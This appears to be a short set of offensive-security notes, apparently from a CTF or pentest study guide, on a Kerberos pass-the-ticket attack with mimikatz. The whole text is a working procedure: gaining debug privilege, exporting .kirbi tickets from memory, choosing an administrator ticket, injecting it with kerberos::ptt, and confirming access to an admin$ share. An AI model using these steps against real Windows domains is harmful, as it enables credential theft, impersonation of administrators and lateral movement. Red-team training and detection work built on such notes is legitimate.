 -mimikatz.exe - run mimikatz

-privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz



-sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in

(May also use harvestest tickets form Rubeus.exe)


--->When looking for which ticket to impersonate, look for an ADMINISTRATOR ticket from the KRBTGT!<---




-kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket



-klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets. To verify this we can look at the admin share: dir \\IP\admin$
